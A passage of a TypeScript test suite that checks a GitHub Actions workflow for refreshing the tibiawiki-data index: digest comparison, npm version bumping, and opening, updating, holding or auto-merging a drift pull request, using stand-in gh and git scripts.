    .map((match) => [match[1]!, { step: match[2]!, name: match[3]! }]));
  assert.equal(outputs.split('\n').filter((line) => line.trim() !== '').length, declared.size, 'the build job declares an output this test cannot read');
  assert.deepEqual([...declared.keys()].sort(),
    ['changed', 'committed', 'hold', 'level', 'package_json_sha256', 'pin_moved', 'pnpm_lock_sha256', 'reasons', 'rebuilt', 'server', 'sha256']);
  // The guard and the schema level run only when the content changed, and a skipped step's output is
  // empty, so hold falls back to false and level to patch. Nothing else may fall back.
  assert.equal(scalar(outputs, 'hold'), "${{ steps.guard.outputs.hold || 'false' }}", 'hold does not fall back to false');
  assert.equal(scalar(outputs, 'level'), "${{ steps.schema.outputs.level || 'patch' }}", 'level does not fall back to patch');
  assert.equal(outputs.match(/\|\|/g)?.length, 2, 'an output other than hold and level falls back to a value');
  const writes = (id: string) => new Set([...stepScript(workflow(), id).matchAll(/^ *echo "([\w-]+)(?:=|<<)/gm)].map((match) => match[1]!));
  for (const [output, { step, name }] of declared) {
    assert.equal(name, output, `the build output ${output} reads ${name}`);
    assert.ok(writes(step).has(name), `the build output ${output} reads ${step}.${name}, which that step never writes`);
  }
  for (const [job, block] of [['build', buildJob()], ['pr', prJob()], ['alert', alertJob()]] as const) {
    for (const [, id, name] of block.matchAll(/steps\.([\w-]+)\.outputs\.([\w-]+)/g)) {
      stepIndex(steps(block), id!);
      // The token step is the action's, which writes its output itself.
      if (id === 'token') {
        assert.equal(name, 'token', `the ${job} job reads token.${name}, which the action does not write`);
        continue;
      }
      assert.ok(writes(id!).has(name!), `the ${job} job reads ${id}.${name}, which that step never writes`);
    }
    for (const [, name] of block.matchAll(/needs\.build\.outputs\.([\w-]+)/g)) {
      assert.ok(declared.has(name!), `the ${job} job reads needs.build.outputs.${name}, which the build job does not declare`);
    }
  }
});

test('the pr job commits as github-actions[bot]', () => {
  const propose = steps(prJob())[stepIndex(steps(prJob()), 'propose')]!;
  const env = under(propose.replace(/^( *)- /, '$1  '), 'env');
  for (const who of ['AUTHOR', 'COMMITTER']) {
    assert.match(env, new RegExp(`^ *GIT_${who}_NAME: *github-actions\\[bot\\]$`, 'm'), `GIT_${who}_NAME is not github-actions[bot]`);
    assert.match(env, new RegExp(`^ *GIT_${who}_EMAIL: *41898282\\+github-actions\\[bot\\]@users\\.noreply\\.github\\.com$`, 'm'),
      `GIT_${who}_EMAIL is not github-actions[bot]'s`);
  }
});

test('the committed digest step writes a digest only when the script printed one', () => {
  const script = stepScript(workflow(), 'committed');
  const good = runStep(script, { files: fakeDigest(`${DIGEST_A}\n`) });
  assert.equal(good.status, 0, good.log);
  assert.equal(good.output, `digest=${DIGEST_A}\n`);
  for (const [what, stdout] of NOT_DIGESTS) {
    const run = runStep(script, { files: fakeDigest(`${stdout}\n`) });
    assert.notEqual(run.status, 0, `the step passed when the script printed ${what}\n${run.log}`);
    assert.equal(run.output, '', `the step wrote an output when the script printed ${what}`);
  }
  const refused = runStep(script, { files: fakeDigest('', 1) });
  assert.notEqual(refused.status, 0, 'the step passed when the script refused the index');
  assert.equal(refused.output, '', 'the step wrote an output when the script refused the index');
});

test('the rebuilt digest step compares the digests and hashes the index it would upload', () => {
  const script = stepScript(workflow(), 'digests');
  const index = { 'index.db': 'rebuilt index' };
  const changed = runStep(script, { files: { ...index, ...fakeDigest(`${DIGEST_B}\n`) }, env: { COMMITTED: DIGEST_A } });
  assert.equal(changed.status, 0, changed.log);
  assert.equal(changed.output, `committed=${DIGEST_A}\nrebuilt=${DIGEST_B}\nsha256=${REBUILT_INDEX_SHA256}\nchanged=true\n`);
  assert.match(changed.log, new RegExp(`${DIGEST_A}[\\s\\S]*${DIGEST_B}`), 'the step does not log both digests');

  const same = runStep(script, { files: { ...index, ...fakeDigest(`${DIGEST_A}\n`) }, env: { COMMITTED: DIGEST_A } });
  assert.equal(same.status, 0, same.log);
  assert.equal(same.output, `committed=${DIGEST_A}\nrebuilt=${DIGEST_A}\nsha256=${REBUILT_INDEX_SHA256}\nchanged=false\n`);
});

test('the rebuilt digest step fails, and decides nothing, on a value that is not a digest', () => {
  const script = stepScript(workflow(), 'digests');
  const index = { 'index.db': 'rebuilt index' };
  for (const [what, value] of NOT_DIGESTS) {
    const committed = runStep(script, { files: { ...index, ...fakeDigest(`${DIGEST_B}\n`) }, env: { COMMITTED: value } });
    assert.notEqual(committed.status, 0, `the step passed with ${what} as the committed digest\n${committed.log}`);
    assert.equal(committed.output, '', `the step wrote outputs with ${what} as the committed digest`);
    const rebuilt = runStep(script, { files: { ...index, ...fakeDigest(`${value}\n`) }, env: { COMMITTED: DIGEST_A } });
    assert.notEqual(rebuilt.status, 0, `the step passed when the script printed ${what}\n${rebuilt.log}`);
    assert.equal(rebuilt.output, '', `the step wrote outputs when the script printed ${what}`);
  }
});

test('the pr job takes the artifact only when its sha256 is the one the build job output', () => {
  const script = stepScript(workflow(), 'verify');
  const files = { 'index.db': 'committed index' };
  const runnerTemp = { 'index/index.db': 'rebuilt index' };

  const good = runStep(script, { files, runnerTemp, env: { SHA256: REBUILT_INDEX_SHA256 } });
  assert.equal(good.status, 0, good.log);
  assert.equal(good.checkout['index.db'], 'rebuilt index', 'the verified artifact did not replace index.db');

  const cases: Array<[string, Parameters<typeof runStep>[1]]> = [
    ['the artifact hashes to another value', { files, runnerTemp, env: { SHA256: DIGEST_A } }],
    ['the expected sha256 is empty', { files, runnerTemp, env: { SHA256: '' } }],
    ['the expected sha256 is uppercase', { files, runnerTemp, env: { SHA256: REBUILT_INDEX_SHA256.toUpperCase() } }],
    ['the artifact holds no index.db', { files, runnerTemp: { 'index/other.db': 'rebuilt index' }, env: { SHA256: REBUILT_INDEX_SHA256 } }],
  ];
  for (const [what, options] of cases) {
    const run = runStep(script, options);
    assert.notEqual(run.status, 0, `the step passed when ${what}\n${run.log}`);
    assert.equal(run.checkout['index.db'], 'committed index', `index.db changed when ${what}`);
  }
});

/** package.json as committed, with `version` in place of its own. */
const manifestAt = (version: string): string =>
  readFileSync(new URL('../package.json', import.meta.url), 'utf8').replace(/"version": "[^"]*"/, `"version": "${version}"`);

/**
 * Runs the version step in a checkout at `current`, with npm printing `npmStdout` and exiting `npmExit`, for a refresh
 * whose content changed at `level`.
 */
const runVersion = (current: string, npmStdout: string, npmExit = 0, level = 'patch') =>
  runStep(stepScript(workflow(), 'version'), {
    files: { 'package.json': manifestAt(current) },
    commands: { npm: `process.stdout.write(${JSON.stringify(npmStdout)});\nprocess.exitCode = ${npmExit};\n` },
    env: { CHANGED: 'true', LEVEL: level },
  });

test('the version step sets the patch after the highest version npm lists in the package major', () => {
  const cases: Array<[string, string[], string]> = [
    ['3.0.0', ['3.0.0'], '3.0.1'],
    // Numbers, not strings: 3.0.10 is above 3.0.9. Other majors and prereleases do not count.
    ['3.0.10', ['2.9.9', '3.0.0', '3.0.9', '3.0.10', '3.0.11-rc.1', '4.0.0'], '3.0.11'],
    ['3.1.2', ['3.0.4', '3.1.2'], '3.1.3'],
    // npm lists versions in publish order, and a patch to an older minor can come last.
    ['3.1.0', ['3.0.0', '3.1.0', '3.0.1'], '3.1.1'],
    // A revert left package.json below the highest published version.
    ['3.0.1', ['3.0.0', '3.0.1', '3.0.2'], '3.0.3'],
  ];
  for (const [current, versions, next] of cases) {
    const list = `${JSON.stringify(versions, null, 2)}\n`;
    const run = runVersion(current, list);
    assert.equal(run.status, 0, `${current} with ${versions.join(', ')} on npm\n${run.log}`);
    assert.equal(run.output, `version=${next}\n`, `${current} with ${versions.join(', ')} on npm`);
    assert.equal(run.checkout['package.json'], manifestAt(next), 'package.json changed in more than its version');
    assert.deepEqual(run.calls, [{ command: 'npm', args: ['view', '@tibia.sh/tibiawiki-data', 'versions', '--json'] }]);
    // Run again while that pull request is open: main and npm are unchanged, and so is the answer.
    assert.equal(runVersion(current, list).output, `version=${next}\n`, 'a second run chose another version');
  }
});

test('the version step fails, and sets nothing, when it cannot find a version npm is missing', () => {
  const cases: Array<[string, string, string, number]> = [
    ['npm cannot read the registry', '3.0.0', '', 1],
    ['npm prints nothing, as it does for a registry answering {}', '3.0.0', '', 0],
    ['npm prints an empty list', '3.0.0', '[]\n', 0],
    ['npm prints something other than a list', '3.0.0', '"3.0.0"\n', 0],
    ['npm prints what is not JSON', '3.0.0', 'npm error\n', 0],
    ['npm lists nothing in the package major', '3.0.0', '["2.0.0", "4.0.0"]\n', 0],
    // Merged but not published yet. Its next patch would be package.json's own version, and
    // merging a pull request that keeps it would publish nothing once that release lands.
    ['package.json holds a version npm does not list yet', '3.0.1', '["3.0.0"]\n', 0],
  ];
  for (const [what, current, npmStdout, npmExit] of cases) {
    const run = runVersion(current, npmStdout, npmExit);
    assert.notEqual(run.status, 0, `the step passed when ${what}\n${run.log}`);
    assert.equal(run.output, '', `the step wrote a version when ${what}`);
    assert.equal(run.checkout['package.json'], manifestAt(current), `package.json changed when ${what}`);
  }
});

/** The commit the stand-in git names as HEAD, and another one. */
const HEAD_SHA = 'a1b2c3d4e5f60718293a4b5c6d7e8f9012345678';
const OTHER_SHA = 'ffeeddccbbaa99887766554433221100ffeeddcc';

/**
 * What a read of the pull request prints, after the push or in the wait: its state, whether it
 * merged, whether auto-merge is on, and its head.
 */
const poll = (state: 'open' | 'closed', merged: boolean, armed: boolean, sha = HEAD_SHA): string =>
  `${state} ${merged} ${armed} ${sha}\n`;

const MERGED = poll('closed', true, false);
const OPEN = poll('open', false, true);
const DISARMED = poll('open', false, false);
const CLOSED = poll('closed', false, false);
/** A poll gh fails. */
const FAIL = 'FAIL';

/** How the stand-in gh answers the propose step. */
type GhScenario = {
  /** What the lookup of the open pull request prints: `<number> <auto-merge on>`, or nothing. */
  open?: string;
  /** What the read of that pull request after the push prints, as `poll` builds it. */
  reread?: string;
  /** The exit code of `gh pr merge --disable-auto`, and of `gh pr merge --auto`. */
  disable?: number;
  enable?: number;
  /** What each poll of the pull request prints, in turn, the last one repeated. FAIL makes gh fail. */
  polls?: string[];
  /** What `git rev-parse HEAD` prints. */
  head?: string;
};

/**
 * A stand-in gh for the propose step. It answers the lookup, a write, a merge, the read after the
 * push and a poll as gh would with the step's --jq filters, and fails any other call. The read
 * after the push is the first read of a pull request after the update, and every other read is a
 * poll. Each call is a process of its own, so it keeps both facts in RUNNER_TEMP.
 */
const fakeGh = ({ open = '', reread = DISARMED, disable = 0, enable = 0, polls = [MERGED] }: GhScenario = {}): string =>
  `const fs = require('node:fs');\n` +
  `const args = process.argv.slice(2);\n` +
  `const patched = process.env.RUNNER_TEMP + '/patched';\n` +
  `if (args[0] === 'pr' && args[1] === 'merge') process.exitCode = args.includes('--disable-auto') ? ${disable} : ${enable};\n` +
  `else if (args.includes('--method') && args.includes('PATCH')) { fs.writeFileSync(patched, ''); process.stdout.write('https://github.com/tibia-sh/tibiawiki-data/pull/7\\n'); }\n` +
  `else if (args.includes('--method')) process.stdout.write('12\\n');\n` +
  `else if (args[0] === 'api' && /\\/pulls\\?head=/.test(args[1])) process.stdout.write(${JSON.stringify(open)});\n` +
  `else if (args[0] === 'api' && /\\/pulls\\/\\d+$/.test(args[1]) && fs.existsSync(patched)) { fs.rmSync(patched); process.stdout.write(${JSON.stringify(reread)}); }\n` +
  `else if (args[0] === 'api' && /\\/pulls\\/\\d+$/.test(args[1])) {\n` +
  `  const counter = process.env.RUNNER_TEMP + '/polls';\n` +
  `  const count = fs.existsSync(counter) ? Number(fs.readFileSync(counter, 'utf8')) : 0;\n` +
  `  fs.writeFileSync(counter, String(count + 1));\n` +
  `  const polls = ${JSON.stringify(polls)};\n` +
  `  const answer = polls[Math.min(count, polls.length - 1)];\n` +
  `  if (answer === ${JSON.stringify(FAIL)}) { process.stderr.write('gh: Server Error (HTTP 502)\\n'); process.exitCode = 1; }\n` +
  `  else process.stdout.write(answer);\n` +
  `} else { process.stderr.write('the stand-in gh does not answer this call\\n'); process.exitCode = 98; }\n`;

/** A stand-in git that names `head` as HEAD and does nothing else. */
const fakeGit = (head = HEAD_SHA): string =>
  `if (process.argv[2] === 'rev-parse') process.stdout.write(${JSON.stringify(`${head}\n`)});\n`;

/** The App token the propose step runs with in these checks, and github.token, which the wait runs with. */
const APP_TOKEN = 'stand-in-app-token';
const GITHUB_TOKEN = 'stand-in-github-token';

/** What both steps of the pr job read from the runner and their env, but the token and what propose hands on. */
const PR_ENV = {
  VERSION: '3.0.1',
  SERVER: '0.13.1',
  CHANGED: 'true',
  COMMITTED: DIGEST_A,
  REBUILT: DIGEST_B,
  HOLD: 'false',
  REASONS: '',
  GITHUB_REPOSITORY: 'tibia-sh/tibiawiki-data',
  GITHUB_REPOSITORY_OWNER: 'tibia-sh',
  GITHUB_SERVER_URL: 'https://github.com',
  GITHUB_RUN_ID: '4242',
  POLL_SECONDS: '0',
  MERGE_DEADLINE_SECONDS: '60',
  RETRY_SECONDS: '0',
};

const HELD_ENV = { ...PR_ENV, HOLD: 'true', REASONS };

/**
 * Runs the pr job's propose step with the App token, then, when it handed on wait=true, the wait with github.token
 * and the number and head propose handed on, as the runner would. The result carries both steps' calls and logs in
 * order, the wait's status when it ran, what propose handed on, and the wait's own run. Each step gets a stand-in gh
 * of its own, as each runs in a process of its own, so every read in the wait is a poll.
 */
const runPr = (gh: GhScenario, env: Record<string, string> = PR_ENV) => {
  const propose = runStep(stepScript(workflow(), 'propose'), {
    commands: { git: fakeGit(gh.head), gh: fakeGh(gh) },
    env: { ...env, GH_TOKEN: APP_TOKEN },
  });
  const handed = stepOutputs(propose.output);
  if (propose.status !== 0 || handed['wait'] !== 'true') return { ...propose, handed, wait: undefined };
  const wait = runStep(stepScript(workflow(), 'wait'), {
    commands: { gh: fakeGh(gh) },
    env: { ...env, GH_TOKEN: GITHUB_TOKEN, NUMBER: handed['number'], HEAD: handed['head'] },
  });
  return { status: wait.status, calls: [...propose.calls, ...wait.calls], log: `${propose.log}${wait.log}`, handed, wait };
};

/** The value after `flag` in `args`, for each time `flag` appears. */
const flagValues = (args: string[], flag: string): string[] =>
  args.flatMap((arg, index) => (arg === flag ? [args[index + 1]!] : []));

/**
 * What the step did, in order, each call named in one word with its arguments: lookup, disable,
 * push, create, update, reread, enable, poll. A read is the reread when it is the first one after
 * the update, as the stand-in gh counts it.
 */
const label = (calls: Call[]): Array<{ action: string; args: string[] }> => {
  let updated = false;
  return calls.flatMap(({ command, args }) => {
    const as = (action: string) => [{ action, args }];
    if (command === 'git') return args.includes('push') ? as('push') : [];
    if (args[0] === 'pr' && args[1] === 'merge') return as(args.includes('--disable-auto') ? 'disable' : 'enable');
    if (args.includes('--method')) {
      updated = args.includes('PATCH');
      return as(updated ? 'update' : 'create');
    }
    if (/\/pulls\?head=/.test(args[1] ?? '')) return as('lookup');
    if (updated) {
      updated = false;
      return as('reread');
    }
    return as('poll');
  });
};

const actions = (calls: Call[]): string[] => label(calls).map(({ action }) => action);

/** The arguments of each call the step made as `action`. */
const argsOf = (calls: Call[], action: string): string[][] => label(calls).filter((call) => call.action === action).map(({ args }) => args);

const ghCalls = (calls: Call[]): string[][] => calls.filter((call) => call.command === 'gh').map((call) => call.args);

test('the pr job force-pushes drift/index and opens a pull request carrying both digests', () => {
  const run = runPr({});
  assert.equal(run.status, 0, run.log);

  const git = run.calls.filter((call) => call.command === 'git').map((call) => call.args);
  const push = git.filter((args) => args.includes('push'));
  assert.equal(push.length, 1, 'expected exactly one git push');
  assert.deepEqual(push[0]!.slice(push[0]!.indexOf('push')), ['push', '--force', 'origin', 'HEAD:refs/heads/drift/index']);
  assert.ok(git.some((args) => args[0] === 'commit'), 'nothing was committed');
  const add = git.find((args) => args[0] === 'add');
  assert.deepEqual(add?.slice(1).sort(), ['index.db', 'package.json', 'pnpm-lock.yaml'],
    'the commit does not take exactly index.db, package.json and pnpm-lock.yaml');
  const commit = git.findIndex((args) => args[0] === 'commit');
  const revParse = git.findIndex((args) => args[0] === 'rev-parse');
  assert.deepEqual(git[revParse], ['rev-parse', 'HEAD'], 'the step does not record the commit it pushes');
  assert.ok(commit < revParse && revParse < git.findIndex((args) => args.includes('push')), 'HEAD is not read between the commit and the push');

  const writes = ghCalls(run.calls).filter((args) => args.includes('--method'));
  assert.equal(writes.length, 1, 'expected exactly one pull request write');
  const [create] = writes as [string[]];
  assert.deepEqual(flagValues(create, '--method'), ['POST']);
  assert.ok(create.includes('repos/tibia-sh/tibiawiki-data/pulls'), `the pull request is not created: ${create.join(' ')}`);
  const fields = flagValues(create, '-f');
  assert.ok(fields.includes('head=drift/index'), 'the pull request is not from drift/index');
  assert.ok(fields.includes('base=main'), 'the pull request is not into main');
  assert.ok(fields.includes('title=chore: release a refreshed index as 3.0.1'), `unexpected title in ${fields.join(' | ')}`);
  const body = fields.find((field) => field.startsWith('body='));
  assert.ok(body?.includes(DIGEST_A) && body.includes(DIGEST_B), 'the pull request body does not carry both digests');
  assert.ok(body?.includes('https://github.com/tibia-sh/tibiawiki-data/actions/runs/4242'), 'the body does not link the run');
  assert.doesNotMatch(body ?? '', /Held for review/, 'a refresh that was not held says it was');

  for (const call of run.calls) {
    for (const token of [APP_TOKEN, GITHUB_TOKEN]) {
      assert.ok(!call.args.join(' ').includes(token), `a token appears on the command line of ${call.command}`);
    }
  }
});

test('the pr job turns on auto-merge with a rebase on the pull request it opened, and waits for the merge of its commit', () => {
  const run = runPr({ polls: [OPEN, OPEN, MERGED] });
  assert.equal(run.status, 0, run.log);
  assert.deepEqual(actions(run.calls), ['lookup', 'push', 'create', 'enable', 'poll', 'poll', 'poll']);
  // propose ends once auto-merge is on, and hands the wait the pull request and the commit it pushed.
  assert.deepEqual(run.handed, { number: '12', head: HEAD_SHA, wait: 'true' });
  assert.deepEqual(actions(run.wait?.calls ?? []), ['poll', 'poll', 'poll'], 'the wait does something other than read');
  const gh = ghCalls(run.calls);
  assert.deepEqual(gh.find((args) => args[0] === 'pr'), ['pr', 'merge', '12', '--auto', '--rebase']);
  for (const args of argsOf(run.calls, 'poll')) {
    assert.deepEqual(args.slice(0, 2), ['api', 'repos/tibia-sh/tibiawiki-data/pulls/12']);
  }
  assert.match(run.log, new RegExp(`#12 merged ${HEAD_SHA}`), 'the step does not say the pull request merged its commit');
});

test('the pr job updates the open drift pull request instead of opening another, and turns on its auto-merge', () => {
  const run = runPr({ open: '7 false\n' });
  assert.equal(run.status, 0, run.log);
  assert.deepEqual(actions(run.calls), ['lookup', 'push', 'update', 'reread', 'enable', 'poll']);
  const gh = ghCalls(run.calls);
  const lookup = gh.filter((args) => /\/pulls\?head=/.test(args[1] ?? ''));
  assert.equal(lookup.length, 1, 'expected one lookup of the open pull request');
  assert.ok(lookup[0]!.some((arg) => arg.includes('head=tibia-sh:drift/index') && arg.includes('state=open')),
    `the lookup does not ask for an open pull request from drift/index: ${lookup[0]!.join(' ')}`);
  const writes = gh.filter((args) => args.includes('--method'));
  assert.deepEqual(flagValues(writes[0]!, '--method'), ['PATCH']);
  assert.ok(writes[0]!.includes('repos/tibia-sh/tibiawiki-data/pulls/7'), `pull request 7 is not the one updated: ${writes[0]!.join(' ')}`);
  const fields = flagValues(writes[0]!, '-f');
  assert.ok(fields.includes('title=chore: release a refreshed index as 3.0.1'), `unexpected title in ${fields.join(' | ')}`);
  const body = fields.find((field) => field.startsWith('body='));
  assert.ok(body?.includes(DIGEST_A) && body.includes(DIGEST_B), 'the updated body does not carry both digests');
  const reread = argsOf(run.calls, 'reread')[0];
  assert.equal(reread?.[1], 'repos/tibia-sh/tibiawiki-data/pulls/7', 'the pull request is not read again by its number');
  assert.deepEqual(gh.find((args) => args[0] === 'pr'), ['pr', 'merge', '7', '--auto', '--rebase']);
});

test('the pr job decides auto-merge from the pull request as it is after the push', () => {
  const armed = runPr({ open: '7 true\n', reread: OPEN, polls: [OPEN, MERGED] });
  assert.equal(armed.status, 0, armed.log);
  assert.deepEqual(actions(armed.calls), ['lookup', 'push', 'update', 'reread', 'poll', 'poll'], 'auto-merge was turned on again');
  const cleared = runPr({ open: '7 true\n', reread: DISARMED });
  assert.equal(cleared.status, 0, cleared.log);
  assert.deepEqual(actions(cleared.calls), ['lookup', 'push', 'update', 'reread', 'enable', 'poll'], 'auto-merge found off after the push stayed off');
});

test('a pull request that merged between the lookup and the push is replaced by a new one, which the job waits on', () => {
  // Waiting on the old number would take its earlier merge for this run's.
  const run = runPr({ open: '7 true\n', reread: poll('closed', true, false, OTHER_SHA), polls: [OPEN, MERGED] });
  assert.equal(run.status, 0, run.log);
  assert.deepEqual(actions(run.calls), ['lookup', 'push', 'update', 'reread', 'create', 'enable', 'poll', 'poll']);
  const gh = ghCalls(run.calls);
  assert.deepEqual(gh.find((args) => args[0] === 'pr'), ['pr', 'merge', '12', '--auto', '--rebase']);
  for (const args of argsOf(run.calls, 'poll')) assert.equal(args[1], 'repos/tibia-sh/tibiawiki-data/pulls/12', 'the wait reads the old pull request');
});

test('a pull request that merged the pushed commit before the read after the push ends the step green', () => {
  // That merge is this run's, so no pull request is opened in its place.
  for (const env of [PR_ENV, HELD_ENV]) {
    const run = runPr({ open: '7 true\n', reread: MERGED }, env);
    assert.equal(run.status, 0, run.log);
    assert.deepEqual(actions(run.calls), ['lookup', ...(env === HELD_ENV ? ['disable'] : []), 'push', 'update', 'reread']);
    assert.match(run.log, new RegExp(`#7 merged ${HEAD_SHA}`), 'the step does not say the pull request merged its commit');
    assert.deepEqual(run.handed, {}, 'propose hands on a wait for a pull request that merged already');
  }
  // Closed without merging is not this run's, and a new one is opened.
  const closed = runPr({ open: '7 false\n', reread: CLOSED });
  assert.equal(closed.status, 0, closed.log);
  assert.deepEqual(actions(closed.calls), ['lookup', 'push', 'update', 'reread', 'create', 'enable', 'poll']);
});

test('a merged refresh says release.yml publishes its version, and a merged pin-only pull request says nothing publishes', () => {
  const refresh = runPr({ polls: [OPEN, MERGED] });
  assert.equal(refresh.status, 0, refresh.log);
  assert.match(refresh.log, new RegExp(`^Pull request #12 merged ${HEAD_SHA}, so release\\.yml publishes 3\\.0\\.1\\.$`, 'm'));
  const pinOnly = runPr({ polls: [OPEN, MERGED] }, { ...PR_ENV, CHANGED: 'false', SERVER: '0.14.1' });
  assert.equal(pinOnly.status, 0, pinOnly.log);
  assert.match(pinOnly.log, new RegExp(`^Pull request #12 merged ${HEAD_SHA}, so release\\.yml publishes nothing: it moved the pin alone, and the version stays 3\\.0\\.1\\.$`, 'm'));
  assert.doesNotMatch(pinOnly.log, /release\.yml publishes 3\.0\.1/, 'a pin-only merge says it publishes its version');
  // The same, when the pull request merged the pushed commit before propose read it again.
  const early = runPr({ open: '7 true\n', reread: MERGED }, { ...PR_ENV, CHANGED: 'false', SERVER: '0.14.1' });
  assert.equal(early.status, 0, early.log);
  assert.match(early.log, new RegExp(`^Pull request #7 merged ${HEAD_SHA} already, so release\\.yml publishes nothing: it moved the pin alone, and the version stays 3\\.0\\.1\\.$`, 'm'));
  const earlyRefresh = runPr({ open: '7 true\n', reread: MERGED });
  assert.match(earlyRefresh.log, new RegExp(`^Pull request #7 merged ${HEAD_SHA} already, so release\\.yml publishes 3\\.0\\.1\\.$`, 'm'));
});

test('the pr job fails when the pull request is closed unmerged, or still open at the deadline', () => {
  const closed = runPr({ polls: [OPEN, CLOSED] });
  assert.notEqual(closed.status, 0, `the step passed when the pull request was closed unmerged\n${closed.log}`);
  assert.match(closed.log, /^::error::.*closed/m, 'the step does not say the pull request was closed');
  assert.deepEqual(actions(closed.calls), ['lookup', 'push', 'create', 'enable', 'poll', 'poll']);

  const late = runPr({ polls: [OPEN] }, { ...PR_ENV, MERGE_DEADLINE_SECONDS: '0' });
  assert.notEqual(late.status, 0, `the step passed when the pull request was still open at the deadline\n${late.log}`);
  assert.match(late.log, /^::error::.*not merged/m, 'the step does not say the pull request has not merged');
  assert.deepEqual(actions(late.calls), ['lookup', 'push', 'create', 'enable', 'poll']);

  for (const odd of ['open\nfalse\n', `open maybe true ${HEAD_SHA}\n`, `open false true ${HEAD_SHA.slice(1)}\n`]) {
    const run = runPr({ polls: [odd] });
    assert.notEqual(run.status, 0, `the step passed on the poll answer ${JSON.stringify(odd)}\n${run.log}`);
  }
});

test('the pr job fails when the pull request merged a head other than the commit it pushed', () => {
  const run = runPr({ polls: [poll('closed', true, false, OTHER_SHA)] });
  assert.notEqual(run.status, 0, `the step passed on a merge of another head\n${run.log}`);
  assert.match(run.log, new RegExp(`^::error::.*${OTHER_SHA}.*${HEAD_SHA}`, 'm'), 'the error does not name both commits');
});

test('the wait ends red when it finds auto-merge off, and never turns it on', () => {
  // The wait holds github.token and no App token, which has expired by then, so it only reads. Auto-merge turned on
  // with github.token would merge as github-actions[bot], a push that starts no release.yml, so a person merges the
  // pull request or turns auto-merge on again, and the drift alert says so.
  const run = runPr({ polls: [OPEN, DISARMED, OPEN, MERGED] });
  assert.notEqual(run.status, 0, `the wait passed when it found auto-merge off\n${run.log}`);
  assert.deepEqual(actions(run.calls), ['lookup', 'push', 'create', 'enable', 'poll', 'poll']);
  assert.deepEqual(actions(run.wait?.calls ?? []), ['poll', 'poll'], 'the wait turned auto-merge on');
  assert.match(run.log, /^::error::Auto-merge on pull request #12 is off\. Merge it, or turn auto-merge on again, by hand\.$/m,
    'the wait does not say auto-merge is off and what to do');
  assert.doesNotMatch(stepScript(workflow(), 'wait'), /\bgh +pr +merge\b|--method/, 'the wait script can write');
  assert.doesNotMatch(waitStep(), /\bsteps\.token\b|\bsecrets\b/, 'the wait step holds the App token');
});

test('the wait reads the pull request again after a failed read, and fails on the third in a row', () => {
  const twice = runPr({ polls: [FAIL, FAIL, MERGED] });
  assert.equal(twice.status, 0, `two failed reads ended the wait\n${twice.log}`);
  assert.deepEqual(actions(twice.calls).filter((action) => action === 'poll').length, 3);

  const reset = runPr({ polls: [FAIL, FAIL, OPEN, FAIL, FAIL, MERGED] });
  assert.equal(reset.status, 0, `a good read did not reset the count\n${reset.log}`);

  const thrice = runPr({ polls: [FAIL, FAIL, FAIL, MERGED] });
  assert.notEqual(thrice.status, 0, `the step passed after three failed reads in a row\n${thrice.log}`);
  assert.deepEqual(actions(thrice.calls).filter((action) => action === 'poll').length, 3, 'the step read a fourth time');
  assert.match(thrice.log, /^::error::.*3 times/m);
});

test('a held refresh turns off auto-merge before it pushes, and opens or updates the pull request with the reasons', () => {
  const run = runPr({ open: '7 true\n' }, HELD_ENV);
  assert.equal(run.status, 0, run.log);
  assert.deepEqual(actions(run.calls), ['lookup', 'disable', 'push', 'update', 'reread']);
  assert.deepEqual(ghCalls(run.calls).find((args) => args[0] === 'pr'), ['pr', 'merge', '7', '--disable-auto']);
  const body = flagValues(ghCalls(run.calls).find((args) => args.includes('--method'))!, '-f').find((field) => field.startsWith('body='));
  assert.ok(body?.startsWith('body=**Held for review.** The refresh was not merged, because:\n\n' +
    '- item lost 150 of 9,800 rows (1.5%)\n- table npc_job is missing\n\n'), `the held body does not start with the reasons: ${body}`);
  assert.ok(body?.includes(DIGEST_A) && body.includes(DIGEST_B), 'the held body does not carry both digests');
});

test('a held refresh turns off auto-merge that is on again after the push', () => {
  const run = runPr({ open: '7 false\n', reread: OPEN }, HELD_ENV);
  assert.equal(run.status, 0, run.log);
  assert.deepEqual(actions(run.calls), ['lookup', 'push', 'update', 'reread', 'disable']);
});

test('a held refresh without auto-merge on turns it neither off nor on', () => {
  const updated = runPr({ open: '7 false\n' }, HELD_ENV);
  assert.equal(updated.status, 0, updated.log);
  assert.deepEqual(actions(updated.calls), ['lookup', 'push', 'update', 'reread']);
  assert.deepEqual(updated.handed, {}, 'propose hands on a wait for a held refresh');
  const created = runPr({}, HELD_ENV);
  assert.equal(created.status, 0, created.log);
  assert.deepEqual(actions(created.calls), ['lookup', 'push', 'create']);
  const body = flagValues(ghCalls(created.calls).find((args) => args.includes('--method'))!, '-f').find((field) => field.startsWith('body='));
  assert.ok(body?.startsWith('body=**Held for review.**'), 'the new held pull request does not say it is held');
  const replaced = runPr({ open: '7 false\n', reread: poll('closed', true, false, OTHER_SHA) }, HELD_ENV);
  assert.equal(replaced.status, 0, replaced.log);
  assert.deepEqual(actions(replaced.calls), ['lookup', 'push', 'update', 'reread', 'create']);
});

test('a held refresh pushes nothing when auto-merge cannot be turned off', () => {
  const run = runPr({ open: '7 true\n', disable: 1 }, HELD_ENV);
  assert.notEqual(run.status, 0, `the step passed when --disable-auto failed\n${run.log}`);
  assert.deepEqual(actions(run.calls), ['lookup', 'disable']);
  assert.deepEqual(run.calls.filter((call) => call.command === 'git'), [], 'git ran after --disable-auto failed');
});

test('the pr job goes no further when the lookup or the read after the push answers with another shape', () => {
  for (const open of ['7\n', 'x true\n', '7 yes\n', '7 true extra\n']) {
    const run = runPr({ open });
    assert.notEqual(run.status, 0, `the step passed when the lookup printed ${JSON.stringify(open)}\n${run.log}`);
    assert.deepEqual(actions(run.calls), ['lookup'], `the step went on after the lookup printed ${JSON.stringify(open)}`);
  }
  for (const reread of ['', 'open false\n', `merged true false ${HEAD_SHA}\n`, `open yes false ${HEAD_SHA}\n`]) {
    const run = runPr({ open: '7 false\n', reread });
    assert.notEqual(run.status, 0, `the step passed when the read after the push printed ${JSON.stringify(reread)}\n${run.log}`);
    assert.deepEqual(actions(run.calls), ['lookup', 'push', 'update', 'reread'], `the step went on after the read printed ${JSON.stringify(reread)}`);
  }
});

test('the pr job pushes nothing when git does not name the commit it made', () => {
  for (const head of ['', HEAD_SHA.slice(1), HEAD_SHA.toUpperCase(), `${HEAD_SHA}\n${OTHER_SHA}`]) {
    const run = runPr({ head });
    assert.notEqual(run.status, 0, `the step passed when git rev-parse HEAD printed ${JSON.stringify(head)}\n${run.log}`);
    assert.deepEqual(actions(run.calls), ['lookup'], `the step pushed when git rev-parse HEAD printed ${JSON.stringify(head)}`);
  }
});

